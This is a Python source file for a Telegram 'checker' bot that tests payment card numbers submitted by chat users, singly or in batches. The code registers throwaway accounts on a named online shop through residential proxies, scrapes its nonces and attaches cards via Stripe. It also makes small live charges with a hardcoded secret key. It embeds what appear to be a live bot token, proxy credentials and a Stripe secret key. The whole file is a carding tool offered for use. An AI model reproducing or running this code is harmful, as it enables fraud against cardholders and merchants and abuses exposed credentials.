import logging
import time
from datetime import datetime
import threading
import queue
import random
import re
from bs4 import BeautifulSoup
import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# Try importing for both versions
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
    NEW_VERSION = True
    print("✅ Detected python-telegram-bot v20+")
except ImportError:
    try:
        from telegram import Update
        from telegram.ext import Updater, CommandHandler, CallbackContext
        NEW_VERSION = False
        print("✅ Detected python-telegram-bot v13")
    except ImportError:
        print("❌ python-telegram-bot not installed!")
        print("Run: pip install python-telegram-bot")
        exit(1)

# Configuration
BOT_TOKEN = "8137441321:AAHYLJt2PcMXteMTKaEokI6fZXOQyStjnxA"
PROXY_STR = "proxy.geonode.io:9000:geonode_8jyRQvRui6-type-residential:305649b7-1a2d-4c8f-8a3a-6505059428ba"
STRIPE_API_KEY = "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"
ADMIN_CHAT_ID = "8014397974"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

last_chk_time = {}
last_mass_time = {}
working_proxies = []
proxy_lock = threading.Lock()

def parse_proxy(proxy_str):
    try:
        parts = proxy_str.split(":")
        if len(parts) == 4:
            host, port, user, passw = parts
            return {"http": f"http://{user}:{passw}@{host}:{port}", "https": f"http://{user}:{passw}@{host}:{port}"}
        elif len(parts) == 2:
            host, port = parts
            return {"http": f"http://{host}:{port}", "https": f"http://{host}:{port}"}
    except:
        pass
    return None

def test_proxy(proxy_str, timeout=10):
    try:
        proxies = parse_proxy(proxy_str)
        if not proxies:
            return False
        session = requests.Session()
        session.proxies = proxies
        response = session.get("https://httpbin.org/ip", timeout=timeout)
        return response.status_code == 200
    except:
        return False

def filter_working_proxies(proxies_list):
    global working_proxies
    working_proxies = []
    for proxy in proxies_list:
        if test_proxy(proxy, timeout=5):
            working_proxies.append(proxy)
            logger.info(f"✅ Working proxy")
        else:
            logger.info(f"❌ Dead proxy")
    logger.info(f"Found {len(working_proxies)} working proxies")
    return working_proxies

def get_random_proxy():
    with proxy_lock:
        if working_proxies:
            return random.choice(working_proxies)
    return None

def generate_fake_gmail():
    random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    return f"{random_string}@gmail.com"

def parse_card_details(card_string):
    card_string = card_string.strip()
    cc, mm, yy, cvv = None, None, None, None

    match = re.search(r'(\d{13,19})[|/\s-]+(\d{1,2})[|/\s-]+(\d{2}|\d{4})[|/\s-]+(\d{3,4})', card_string)
    if match:
        cc, mm, yy, cvv = match.groups()
    else:
        temp = card_string
        cc_match = re.search(r'\d{13,19}', temp)
        if cc_match: 
            cc = cc_match.group(0)
            temp = temp.replace(cc, '', 1)
        mm_match = re.search(r'(?:MM:|M:)?\s*(\d{1,2})(?!\d)', temp)
        if mm_match: 
            mm = mm_match.group(1)
            temp = temp.replace(mm_match.group(0), '', 1)
        yy_match = re.search(r'(?:YY:|Y:)?\s*(\d{2}|\d{4})(?!\d)', temp)
        if yy_match: 
            yy = yy_match.group(1)
            temp = temp.replace(yy_match.group(0), '', 1)
        cvv_match = re.search(r'(?:CVV:|CVC:)?\s*(\d{3,4})(?!\d)', temp)
        if cvv_match: 
            cvv = cvv_match.group(1)

    if not all([cc, mm, yy, cvv]):
        return None, None, None, None

    try:
        mm_int = int(mm)
        if not (1 <= mm_int <= 12):
            return None, None, None, None
        current_year = datetime.now().year
        if len(yy) == 2:
            yy_full = int(f"20{yy}") if int(yy) >= (current_year % 100) else int(f"19{yy}")
        else:
            yy_full = int(yy)
        if not (current_year <= yy_full <= current_year + 15):
            return None, None, None, None
    except:
        return None, None, None, None

    return cc, str(mm_int).zfill(2), str(yy_full)[-2:], cvv

def format_card_result(status, card, message, extra_info=None):
    if status == "approved":
        emoji, status_text = "✅", "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    elif status == "declined":
        emoji, status_text = "❌", "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
    elif status == "error":
        emoji, status_text = "⚠️", "𝗘𝗥𝗥𝗢𝗥"
    else:
        emoji, status_text = "ℹ️", "𝗜𝗡𝗙𝗢"
    
    result = f"{emoji} <b>{status_text}</b>\n━━━━━━━━━━━━━━━━\n<code>{card}</code>\n━━━━━━━━━━━━━━━━\n<b>Response:</b> {message}\n"
    if extra_info:
        result += f"<b>Info:</b> {extra_info}\n"
    result += "━━━━━━━━━━━━━━━━"
    return result

def clean_error_message(error_str):
    error_str = str(error_str)
    if "for url:" in error_str.lower():
        error_str = error_str.split("for url:")[0].strip()
    if "https://" in error_str or "http://" in error_str:
        error_str = "Gateway error - please try again"
    return error_str

def process_card_logic(bot, card, user_id=None, max_retries=1):
    cc, mm, yy, cvv = card.split("|")
    mail = generate_fake_gmail()
    
    for attempt in range(max_retries):
        proxy = get_random_proxy()
        session = requests.Session()
        if proxy:
            proxies = parse_proxy(proxy)
            if proxies:
                session.proxies = proxies
        
        headers = {
            'authority': 'bahamabos.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        }

        try:
            response = session.get('https://bahamabos.com/my-account/', headers=headers, timeout=10)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            nonce = soup.find(id="woocommerce-register-nonce")
            if not nonce:
                raise Exception("Nonce not found")
            nonce_value = nonce["value"]

            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bahamabos.com',
                'referer': 'https://bahamabos.com/my-account/',
                'sec-fetch-site': 'same-origin'
            })

            data = {
                'email': mail,
                'woocommerce-register-nonce': nonce_value,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }

            response = session.post('https://bahamabos.com/my-account/', headers=headers, data=data, timeout=10)
            response.raise_for_status()

            headers.pop('content-type', None)
            headers['referer'] = 'https://bahamabos.com/my-account/'
            
            response = session.get('https://bahamabos.com/my-account/add-payment-method/', headers=headers, timeout=10)
            response.raise_for_status()

            soup2 = BeautifulSoup(response.text, 'html.parser')
            ajax_nonce = None
            for script in soup2.find_all('script'):
                if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                    match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', script.string)
                    if match: 
                        ajax_nonce = match.group(1)
                        break
            
            if not ajax_nonce:
                raise Exception("Ajax nonce not found")

            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }

            stripe_data = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "billing_details[address][country]": "IN",
                "payment_user_agent": "stripe.js/9a3c9afc22; stripe-js-v3/9a3c9afc22; payment-element; deferred-intent",
                "referrer": "https://bahamabos.com",
                "time_on_page": "180482",
                "client_attribution_metadata[client_session_id]": "99353590-d3c5-43a3-af4b-35f1eabfb684",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": "a490b5d6-24ed-47f1-b981-ea3802b3ab6f",
                "guid": "b9704ca5-73c4-4975-a9d4-f45890b863a45fede3",
                "muid": "c40c19d4-4eb2-4e21-b7ad-35410ad5a9ba8f162e",
                "sid": "d2d86738-a87f-424b-8d3a-746f8636762889e2a7",
                "key": "pk_live_axb2b6B9U2aIqQq93VRd6qF6009oO6P3ds",
                "_stripe_version": "2024-06-20",
            }

            response = session.post('https://api.stripe.com/v1/payment_methods', 
                                  headers=stripe_headers, data=stripe_data, timeout=10)
            response.raise_for_status()
            
            pm_id = response.json().get("id")
            if not pm_id:
                raise Exception("Payment method ID not found")

            final_headers = headers.copy()
            final_headers.update({
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'referer': 'https://bahamabos.com/my-account/add-payment-method/',
                'x-requested-with': 'XMLHttpRequest',
            })

            final_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }

            response = session.post('https://bahamabos.com/wp-admin/admin-ajax.php', headers=final_headers, data=final_data, timeout=10)
            
            if response.status_code == 403:
                raise Exception("Access forbidden - gateway blocked request")
            
            response.raise_for_status()
            json_response = response.json()
            
            if json_response.get("success"):
                return format_card_result("approved", card, "Card Approved Successfully! ✅")
            else:
                error_msg = json_response.get("data", {}).get("error", {}).get("message", "Unknown error")
                return format_card_result("declined", card, error_msg)

        except Exception as e:
            logger.error(f"Attempt {attempt + 1} failed: {str(e)}")
            if attempt == max_retries - 1:
                error_str = clean_error_message(e)
                return format_card_result("error", card, f"Processing failed: {error_str}")
    
    return format_card_result("error", card, "Max retries exceeded")

class StripeCardChecker:
    def __init__(self, bot, admin_chat_id=None, mode='charge', stripe_api_key=None):
        self.bot = bot
        self.stripe_api_key = stripe_api_key or STRIPE_API_KEY
        
    def process_card(self, card, user_id=None):
        cc, mm, yy, cvv = card.split("|")
        
        try:
            session = requests.Session()
            full_year = f"20{yy}" if len(yy) == 2 else yy
            
            pm_data = {
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm.zfill(2),
                "card[exp_year]": full_year,
                "card[cvc]": cvv,
                "billing_details[name]": "John Doe",
                "billing_details[email]": generate_fake_gmail(),
                "billing_details[address][line1]": "123 Main St",
                "billing_details[address][city]": "New York",
                "billing_details[address][state]": "NY",
                "billing_details[address][postal_code]": "10001",
                "billing_details[address][country]": "US",
            }
            
            pm_headers = {
                "Authorization": f"Bearer {self.stripe_api_key}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            }
            
            pm_response = session.post("https://api.stripe.com/v1/payment_methods", headers=pm_headers, data=pm_data, timeout=10)
            pm_json = pm_response.json()
            
            if pm_response.status_code != 200:
                error_msg = pm_json.get("error", {}).get("message", "Unknown error")
                decline_code = pm_json.get("error", {}).get("decline_code", "")
                if decline_code:
                    error_msg += f" ({decline_code})"
                return format_card_result("declined", card, error_msg)
            
            pm_id = pm_json.get("id")
            if not pm_id:
                return format_card_result("error", card, "Failed to create payment method")
            
            pi_data = {
                "amount": "100",
                "currency": "usd",
                "payment_method": pm_id,
                "confirm": "true",
                "off_session": "true",
                "description": "Auth test",
            }
            
            pi_response = session.post("https://api.stripe.com/v1/payment_intents", headers=pm_headers, data=pi_data, timeout=10)
            pi_json = pi_response.json()
            
            if pi_response.status_code == 200:
                status = pi_json.get("status")
                if status == "succeeded":
                    return format_card_result("approved", card, "Card Charged Successfully! ✅")
                elif status == "requires_payment_method":
                    error = pi_json.get("last_payment_error", {})
                    error_msg = error.get("message", "Payment method required")
                    decline_code = error.get("decline_code", "")
                    if decline_code:
                        error_msg += f" ({decline_code})"
                    return format_card_result("declined", card, error_msg)
                elif status == "requires_action":
                    return format_card_result("declined", card, "3D Secure required")
                else:
                    return format_card_result("declined", card, f"Status: {status}")
            else:
                error = pi_json.get("error", {})
                error_msg = error.get("message", "Unknown error")
                decline_code = error.get("decline_code", "")
                if decline_code:
                    error_msg += f" ({decline_code})"
                return format_card_result("declined", card, error_msg)
                
        except Exception as e:
            logger.error(f"Stripe check failed: {str(e)}")
            error_str = clean_error_message(e)
            return format_card_result("error", card, f"Processing failed: {error_str}")

# Command handlers
async def start(update: Update, context) -> None:
    welcome_msg = (
        "🤖 <b>Welcome to Putin Checker Bot!</b>\n━━━━━━━━━━━━━━━━\n\n"
        "<b>Commands:</b>\n"
        "• <code>/chk CC|MM|YY|CVV</code> - Check single card\n"
        "• <code>/mass</code> - Check multiple cards\n"
        "• <code>/st CC|MM|YY|CVV</code> - Stripe SK check\n"
        "• <code>/mst</code> - Stripe SK mass check\n\n"
        "━━━━━━━━━━━━━━━━\n⚡ <b>Fast • Reliable • Secure</b>"
    )
    await update.message.reply_text(welcome_msg, parse_mode='HTML')

async def chk(update: Update, context) -> None:
    user_id = update.effective_user.id
    current_time = datetime.now()

    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await update.message.reply_text(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time

    if not context.args:
        await update.message.reply_text("❌ Usage: <code>/chk CC|MM|YY|CVV</code>", parse_mode='HTML')
        return

    card_input = " ".join(context.args)
    cc, mm, yy, cvv = parse_card_details(card_input)

    if not all([cc, mm, yy, cvv]):
        await update.message.reply_text("❌ Invalid format", parse_mode='HTML')
        return

    card_formatted = f"{cc}|{mm}|{yy}|{cvv}"
    await update.message.reply_text(f"🔄 Processing <code>{card_formatted}</code>", parse_mode='HTML')
    
    result = process_card_logic(context.bot if hasattr(context, 'bot') else None, card_formatted, user_id)
    await update.message.reply_text(result, parse_mode='HTML')

async def mass(update: Update, context) -> None:
    user_id = update.effective_user.id
    current_time = datetime.now()

    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await update.message.reply_text(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time

    message_text = update.message.text
    if not message_text:
        await update.message.reply_text("❌ Provide cards (one per line)", parse_mode='HTML')
        return
    
    cards_text = message_text.replace('/mass', '', 1).strip()
    if not cards_text:
        await update.message.reply_text("❌ Provide cards (one per line)", parse_mode='HTML')
        return

    cards_to_check = []
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")

    if not cards_to_check:
        await update.message.reply_text("❌ No valid cards", parse_mode='HTML')
        return
    
    if len(cards_to_check) > 10:
        cards_to_check = cards_to_check[:10]

    await update.message.reply_text(f"🚀 Processing {len(cards_to_check)} cards", parse_mode='HTML')
    
    for idx, card in enumerate(cards_to_check, 1):
        result = process_card_logic(context.bot if hasattr(context, 'bot') else None, card, user_id)
        await update.message.reply_text(f"<b>{idx}/{len(cards_to_check)}</b>\n{result}", parse_mode='HTML')
        
    
    await update.message.reply_text(f"✅ Completed {len(cards_to_check)} cards", parse_mode='HTML')

async def st(update: Update, context) -> None:
    if not context.args:
        await update.message.reply_text("❌ Usage: <code>/st CC|MM|YY|CVV</code>", parse_mode='HTML')
        return

    card_input = " ".join(context.args)
    cc, mm, yy, cvv = parse_card_details(card_input)

    if not all([cc, mm, yy, cvv]):
        await update.message.reply_text("❌ Invalid format", parse_mode='HTML')
        return
    
    card_formatted = f"{cc}|{mm}|{yy}|{cvv}"
    await update.message.reply_text(f"🔄 Stripe check <code>{card_formatted}</code>", parse_mode='HTML')
    
    checker = StripeCardChecker(context.bot if hasattr(context, 'bot') else None, ADMIN_CHAT_ID, stripe_api_key=STRIPE_API_KEY)
    result = checker.process_card(card_formatted, update.effective_user.id)
    await update.message.reply_text(result, parse_mode='HTML')

async def mst(update: Update, context) -> None:
    message_text = update.message.text
    if not message_text:
        await update.message.reply_text("❌ Provide cards", parse_mode='HTML')
        return
    
    cards_text = message_text.replace('/mst', '', 1).strip()
    if not cards_text:
        await update.message.reply_text("❌ Provide cards", parse_mode='HTML')
        return

    cards_to_check = []
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")

    if not cards_to_check:
        await update.message.reply_text("❌ No valid cards", parse_mode='HTML')
        return
    
    if len(cards_to_check) > 10:
        cards_to_check = cards_to_check[:10]

    await update.message.reply_text(f"🚀 Stripe check {len(cards_to_check)} cards", parse_mode='HTML')
    
    checker = StripeCardChecker(context.bot if hasattr(context, 'bot') else None, ADMIN_CHAT_ID, stripe_api_key=STRIPE_API_KEY)
    
    for idx, card in enumerate(cards_to_check, 1):
        result = checker.process_card(card, update.effective_user.id)
        await update.message.reply_text(f"<b>{idx}/{len(cards_to_check)}</b>\n{result}", parse_mode='HTML')
        
    
    await update.message.reply_text(f"✅ Completed {len(cards_to_check)} cards", parse_mode='HTML')

def main() -> None:
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set")
        return

    global working_proxies
    if PROXY_STR:
        logger.info("🔄 Testing proxy...")
        working_proxies = filter_working_proxies([PROXY_STR])

    if NEW_VERSION:
        # python-telegram-bot v20+
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("chk", chk))
        app.add_handler(CommandHandler("mass", mass))
        app.add_handler(CommandHandler("st", st))
        app.add_handler(CommandHandler("mst", mst))
        logger.info("✅ Bot started (v20+)")
        app.run_polling()
    else:
        # python-telegram-bot v13
        updater = Updater(BOT_TOKEN)
        dispatcher = updater.dispatcher
        dispatcher.add_handler(CommandHandler("start", start))
        dispatcher.add_handler(CommandHandler("chk", chk))
        dispatcher.add_handler(CommandHandler("mass", mass))
        dispatcher.add_handler(CommandHandler("st", st))
        dispatcher.add_handler(CommandHandler("mst", mst))
        logger.info("✅ Bot started (v13)")
        updater.start_polling()
        updater.idle()

if __name__ == '__main__':
    main()

